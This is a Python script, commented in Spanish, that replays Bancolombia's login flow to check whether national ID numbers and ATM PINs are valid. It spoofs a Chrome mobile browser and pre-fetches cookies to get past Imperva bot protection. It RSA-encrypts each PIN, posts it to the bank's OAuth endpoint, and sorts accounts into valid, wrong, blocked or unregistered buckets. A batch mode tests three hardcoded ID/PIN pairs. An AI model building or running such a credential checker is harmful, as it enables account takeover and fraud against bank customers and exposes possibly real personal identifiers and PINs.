"""Bot Bancolombia 100% Python -- replica el flujo mobile que pasa Imperva.

Descubierto en harprueba.har (capturado via HTTP Toolkit con celu Android):
La API mobile usa los mismos endpoints que el web pero desde cellular IP
Imperva los deja pasar limpio (200 sin challenge).

Flujo:
  1. GET pubkey RSA   <- /projects/config/security/public-key
  2. RSA-OAEP-256 encrypt(clave_cajero)  -> hex string (256 bytes / 512 hex)
  3. POST oauth2/token (grant_type=password) con:
        - document_number en cleartext
        - password = clave cifrada
        - document_type=TIPDOC_FS001 (CC)
        - scope=DOC
        - client_id (fijo, observado en HAR)
        Headers especiales: device-id, session-tracker, message-id,
        request-timestamp, channel=SVP, platform-type=web.
  4. POST identity con {documentType, document} + Bearer del oauth
        -> response.data.stateRegistry = "Registered" / etc.

Buckets:
  - OK              : oauth 200, identity stateRegistry="Registered"
  - DATOS_INCORRECTOS: oauth 4xx (clave incorrecta o cedula desconocida)
  - BLOQUEADO       : oauth 4xx con mensaje de bloqueo
  - SIN_USUARIO     : identity stateRegistry != "Registered"
  - ERROR           : excepcion / red / timeout

NOTA: necesito mas HARs con casos failed para mapear errorCodes a buckets
con precision. Por ahora se infiere del status code y el body.
"""
from __future__ import annotations

import argparse
import binascii
import json
import logging
import time
import uuid
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from typing import Any

import httpx
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa

log = logging.getLogger("bancolombia_api")

# ---- endpoints --------------------------------------------------------------

BASE = "https://svpersonas.apps.bancolombia.com"
CANAL = "https://canalpersonas-ext.apps.bancolombia.com"
WARMUP_URL = f"{BASE}/crear-usuario/ingresa-tus-datos"
PUBKEY_URL = f"{BASE}/projects/config/security/public-key"
# Endpoint GET publico de canalpersonas que el browser hits antes del oauth
# (en el HAR estaba en /super-svp-ch-ms-configuration/parameters). Sirve para
# obtener cookies Imperva del segundo dominio (incap_ses_2703_2976147 etc).
CANAL_WARMUP_URL = f"{CANAL}/super-svp/api/v1/security-filters/super-svp-ch-ms-configuration/parameters"
OAUTH_URL = (
    f"{CANAL}/super-svp/api/v1/security-filters"
    "/authorization-services/authentication/id/oauth2/token"
)
IDENTITY_URL = (
    f"{CANAL}/super-svp/api/v1/security-filters"
    "/super-ch-ms-alias-identity/identity"
)

MOBILE_UA = (
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36"
)

# Observados literales en el HAR mobile. NO los rotemos a la ligera.
CLIENT_ID = "tCOVIxsPfSbbAa+OFH1IbgWcD6HkqXWyXi6x9pj4ZXM="  # ya URL-encoded por requests
DOC_TYPE_CC = "TIPDOC_FS001"
APP_VERSION = "3.8.3"
CHANNEL = "SVP"
PLATFORM_TYPE = "web"

# Buckets
BUCKET_OK = "OK"
BUCKET_DATOS_INCORRECTOS = "DATOS_INCORRECTOS"
BUCKET_BLOQUEADO = "BLOQUEADO"
BUCKET_SIN_USUARIO = "SIN_USUARIO"
BUCKET_ERROR_BANCO = "ERROR_BANCO"
BUCKET_ERROR_RED = "ERROR_RED"


@dataclass
class Result:
    cedula: str
    clave_present: bool
    bucket: str
    state_registry: str | None = None
    oauth_status: int | None = None
    identity_status: int | None = None
    error_code: str | None = None
    error_message: str | None = None
    raw_oauth: dict[str, Any] | None = None
    raw_identity: dict[str, Any] | None = None
    duration_s: float = 0.0


# ---- helpers ----------------------------------------------------------------


def _public_key_from_hex_n(n_hex: str, e_hex: str) -> rsa.RSAPublicKey:
    """Bancolombia devuelve la pubkey como hex de n y e."""
    n = int(n_hex, 16)
    e = int(e_hex, 16)
    return rsa.RSAPublicNumbers(e=e, n=n).public_key()


def encrypt_password(pubkey: rsa.RSAPublicKey, clave: str) -> str:
    """Cifra la clave del cajero con RSA-OAEP-256 -> hex uppercase.

    El cleartext es la clave en str UTF-8. Observado en HAR: 256 bytes ciphertext
    = 512 hex chars. Encajan en hasta 190 bytes plaintext (overhead OAEP-256).
    """
    ct = pubkey.encrypt(
        clave.encode("utf-8"),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )
    return ct.hex().upper()


def _gen_device_id() -> str:
    """device-id observado: 32 hex chars (UUID4 sin guiones)."""
    return uuid.uuid4().hex


def _gen_uuid() -> str:
    return str(uuid.uuid4())


def _timestamp() -> str:
    """Formato observado: '2026-06-04 22:03:33:221' (ms con `:` en vez de `.`)."""
    now = datetime.now(timezone.utc).astimezone()
    ms = now.microsecond // 1000
    return f"{now:%Y-%m-%d %H:%M:%S}:{ms:03d}"


def _browser_headers() -> dict[str, str]:
    """Headers exactos del Chrome mobile que ve Imperva."""
    return {
        "User-Agent": MOBILE_UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9,es-US;q=0.8,es;q=0.7",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
    }


def _xhr_headers() -> dict[str, str]:
    """Headers para los XHRs (pubkey, oauth, identity)."""
    return {
        "User-Agent": MOBILE_UA,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9,es-US;q=0.8,es;q=0.7",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Referer": WARMUP_URL,
    }


def _api_headers(device_id: str, session_tracker: str, ip: str | None = None) -> dict[str, str]:
    """Headers para los POST a canalpersonas (oauth, identity) -- estos van con
    headers custom de Bancolombia ademas de los XHR estandar."""
    h = _xhr_headers()
    h.update({
        "app-version": APP_VERSION,
        "channel": CHANNEL,
        "device-id": device_id,
        "device-info": json.dumps(
            {"device": "Windows", "os": "Android", "browser": "Chrome-148", "major": "148"},
            separators=(",", ":"),
        ),
        "message-id": _gen_uuid(),
        "platform-type": PLATFORM_TYPE,
        "request-timestamp": _timestamp(),
        "session-tracker": session_tracker,
        "Origin": BASE,
        "Sec-Fetch-Site": "cross-site",
    })
    if ip:
        h["ip"] = ip
    return h


# ---- core ------------------------------------------------------------------


async def _warmup(client: httpx.AsyncClient) -> int:
    """GET inicial a la pagina para que Imperva nos setee cookies de sesion.

    Sin este warmup, el GET directo a /projects/config/security/public-key
    da 403 porque Imperva exige cookies incap_ses_* y visid_incap_*.
    """
    r = await client.get(WARMUP_URL, headers=_browser_headers(), timeout=30)
    return r.status_code


async def _warmup_canal(
    client: httpx.AsyncClient, device_id: str, session_tracker: str
) -> int:
    """Hit a canalpersonas para obtener su propio Imperva session cookie
    (incap_ses para site 2976147 segun el HAR).
    """
    h = _api_headers(device_id, session_tracker)
    # OPTIONS preflight como hace el browser para CORS
    try:
        await client.request(
            "OPTIONS", CANAL_WARMUP_URL,
            headers={
                **_xhr_headers(),
                "Origin": BASE,
                "Access-Control-Request-Method": "GET",
                "Access-Control-Request-Headers": "app-version,channel,device-id,device-info,message-id,platform-type,request-timestamp,session-tracker",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "cross-site",
            },
            timeout=20,
        )
    except Exception:
        pass
    r = await client.get(CANAL_WARMUP_URL, headers=h, timeout=20)
    return r.status_code


async def _get_pubkey(client: httpx.AsyncClient) -> rsa.RSAPublicKey:
    r = await client.get(PUBKEY_URL, headers=_xhr_headers(), timeout=20)
    r.raise_for_status()
    j = r.json()
    return _public_key_from_hex_n(j["n"], j["e"])


async def _options_preflight(
    client: httpx.AsyncClient, url: str, method: str, request_headers: list[str]
) -> None:
    """CORS preflight como hace el browser antes de POSTs cross-origin."""
    try:
        await client.request(
            "OPTIONS", url,
            headers={
                **_xhr_headers(),
                "Origin": BASE,
                "Access-Control-Request-Method": method,
                "Access-Control-Request-Headers": ",".join(request_headers),
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "cross-site",
            },
            timeout=15,
        )
    except Exception:
        pass


async def _oauth_token(
    client: httpx.AsyncClient,
    cedula: str,
    clave_encrypted_hex: str,
    headers: dict[str, str],
) -> httpx.Response:
    # OPTIONS preflight primero (el browser lo hace automatico)
    await _options_preflight(
        client, OAUTH_URL, "POST",
        ["app-version", "channel", "content-type", "device-id", "device-info",
         "ip", "message-id", "platform-type", "request-timestamp", "session-tracker"],
    )
    body = {
        "grant_type": "password",
        "client_id": CLIENT_ID,
        "scope": "DOC",
        "password": clave_encrypted_hex,
        "document_type": DOC_TYPE_CC,
        "document_number": cedula,
    }
    h = dict(headers)
    h["content-type"] = "application/x-www-form-urlencoded"
    return await client.post(OAUTH_URL, data=body, headers=h, timeout=30)


async def _identity(
    client: httpx.AsyncClient,
    cedula: str,
    bearer: str,
    headers: dict[str, str],
) -> httpx.Response:
    h = dict(headers)
    h["content-type"] = "application/json"
    h["authorization"] = f"Bearer {bearer}"
    body = {"documentType": DOC_TYPE_CC, "document": cedula}
    return await client.post(IDENTITY_URL, json=body, headers=h, timeout=30)


# ---- classify --------------------------------------------------------------


async def classify(cedula: str, clave: str, *, client_ip: str | None = None) -> Result:
    t0 = time.time()
    device_id = _gen_device_id()
    session_tracker = _gen_uuid()

    async with httpx.AsyncClient(http2=True, follow_redirects=True) as client:
        # 1) WARMUP -- recibe cookies de Imperva (incap_ses_*, visid_incap_*)
        try:
            wcode = await _warmup(client)
            log.info("warmup status=%s cookies=%d", wcode, len(client.cookies.jar))
        except Exception as e:
            log.exception("falla warmup")
            return Result(
                cedula=cedula, clave_present=bool(clave), bucket=BUCKET_ERROR_RED,
                error_message=f"warmup: {e}", duration_s=time.time() - t0,
            )

        # 2) pubkey con las cookies del warmup ya cargadas en el client
        try:
            pubkey = await _get_pubkey(client)
        except Exception as e:
            log.exception("falla GET pubkey")
            return Result(
                cedula=cedula, clave_present=bool(clave), bucket=BUCKET_ERROR_RED,
                error_message=f"pubkey: {e}", duration_s=time.time() - t0,
            )

        # 3) warmup tambien al dominio canalpersonas para sus propias cookies
        try:
            cw = await _warmup_canal(client, device_id, session_tracker)
            log.info("warmup canal status=%s cookies_total=%d", cw, len(client.cookies.jar))
        except Exception as e:
            log.warning("warmup canal fail (continuamos): %s", e)

        headers = _api_headers(device_id, session_tracker, ip=client_ip)

        try:
            pwd_enc = encrypt_password(pubkey, clave)
        except Exception as e:
            return Result(
                cedula=cedula, clave_present=bool(clave), bucket=BUCKET_ERROR_BANCO,
                error_message=f"encrypt: {e}", duration_s=time.time() - t0,
            )

        try:
            r_oauth = await _oauth_token(client, cedula, pwd_enc, headers)
        except Exception as e:
            log.exception("falla OAuth")
            return Result(
                cedula=cedula, clave_present=bool(clave), bucket=BUCKET_ERROR_RED,
                error_message=f"oauth: {e}", duration_s=time.time() - t0,
            )

        oauth_body: dict[str, Any] = {}
        try:
            oauth_body = r_oauth.json()
        except Exception:
            oauth_body = {"raw": r_oauth.text[:500]}

        # OAuth fallido -> mapear codigo a bucket
        if r_oauth.status_code >= 400 or "accessToken" not in oauth_body.get("data", {}):
            err = oauth_body.get("errors") or oauth_body.get("data") or oauth_body
            err_text = json.dumps(err, ensure_ascii=False)[:500]
            err_lower = err_text.lower()
            if "bloqueada" in err_lower or "bloqueado" in err_lower or "intentos" in err_lower:
                bucket = BUCKET_BLOQUEADO
            elif "no encontr" in err_lower or "no existe" in err_lower:
                bucket = BUCKET_SIN_USUARIO
            else:
                bucket = BUCKET_DATOS_INCORRECTOS
            return Result(
                cedula=cedula, clave_present=bool(clave), bucket=bucket,
                oauth_status=r_oauth.status_code,
                error_message=err_text,
                raw_oauth=oauth_body,
                duration_s=time.time() - t0,
            )

        access_token = oauth_body["data"]["accessToken"]

        # Identity con el Bearer
        try:
            r_id = await _identity(client, cedula, access_token, headers)
        except Exception as e:
            log.exception("falla identity")
            return Result(
                cedula=cedula, clave_present=bool(clave), bucket=BUCKET_ERROR_RED,
                oauth_status=r_oauth.status_code,
                error_message=f"identity: {e}",
                raw_oauth=oauth_body,
                duration_s=time.time() - t0,
            )

        id_body: dict[str, Any] = {}
        try:
            id_body = r_id.json()
        except Exception:
            id_body = {"raw": r_id.text[:500]}

        state = (id_body.get("data") or {}).get("stateRegistry")
        if state == "Registered":
            bucket = BUCKET_OK
        elif state in (None, "Unregistered", "NotRegistered", "NotFound"):
            bucket = BUCKET_SIN_USUARIO
        else:
            bucket = BUCKET_DATOS_INCORRECTOS  # estado raro; fallback
        return Result(
            cedula=cedula, clave_present=bool(clave), bucket=bucket,
            state_registry=state,
            oauth_status=r_oauth.status_code,
            identity_status=r_id.status_code,
            raw_oauth=oauth_body,
            raw_identity=id_body,
            duration_s=time.time() - t0,
        )


# ---- CLI -------------------------------------------------------------------


def _print_result(r: Result) -> None:
    print(f"  cedula            = {r.cedula}")
    print(f"  bucket            = {r.bucket}")
    print(f"  stateRegistry     = {r.state_registry}")
    print(f"  oauth/identity    = {r.oauth_status} / {r.identity_status}")
    if r.error_message:
        print(f"  error             = {r.error_message[:200]}")
    print(f"  duration          = {r.duration_s:.2f}s")


async def _main_async():
    import asyncio  # noqa

    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)-7s %(name)s :: %(message)s")
    ap = argparse.ArgumentParser()
    ap.add_argument("cedula", nargs="?")
    ap.add_argument("clave", nargs="?")
    ap.add_argument("--batch", action="store_true", help="los 3 casos de prueba")
    ap.add_argument("--ip", default=None, help="IP a poner en el header (cellular si quisieras)")
    args = ap.parse_args()

    if args.batch:
        casos = [
            ("79612743", "0000"),
            ("1030648205", "2872"),
            ("80009246", "1379"),
        ]
        for c, k in casos:
            print(f"\n>>> {c} / {k}")
            r = await classify(c, k, client_ip=args.ip)
            _print_result(r)
    else:
        if not args.cedula or not args.clave:
            ap.error("dame cedula + clave, o usa --batch")
        print(f">>> {args.cedula} / {args.clave}")
        r = await classify(args.cedula, args.clave, client_ip=args.ip)
        _print_result(r)


def main():
    import asyncio
    asyncio.run(_main_async())


if __name__ == "__main__":
    main()
